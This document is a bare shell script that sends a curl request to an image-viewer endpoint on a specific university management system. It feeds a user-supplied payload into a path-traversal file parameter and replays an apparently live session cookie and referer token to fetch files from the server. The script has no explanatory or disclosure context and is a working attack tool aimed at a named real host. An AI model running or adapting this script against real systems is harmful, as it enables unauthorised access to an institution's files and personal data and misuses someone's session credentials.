PAYLOAD=$1
curl -s "https://ims.iiit.ac.in/pw_imageview.php?file=../uploads/iiithyd/$PAYLOAD.jpg" \
  -H 'Accept: text/html,*/*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=ST-606991-UibBKL2U3MiqvGJ-Oo-DzDBaSvM-login' \
  -H 'DNT: 1' \
  -H 'Referer: https://ims.iiit.ac.in/do.php?WokTSAfM/W5R++YLtpVyvb4LUA+PlDjabQAQPfPBVtCk9eOFkwkstasNQnKtOOO/Ip9ygTZt0j8saAVJ6cftLwhQ8Vj1ZgUR3Uso/3nvwLv0xw2vwn7P7oDYDByxk7c4+UQYzJgfMpyao30sUoCqC2FFuuM1Vn1r0y/S1fmK2xDazi3udjwXI/TRYVwTsKIN' \
  -H 'Sec-Fetch-Dest: image' \
  -H 'Sec-Fetch-Mode: no-cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  --compressed --output outfile.jpg
  
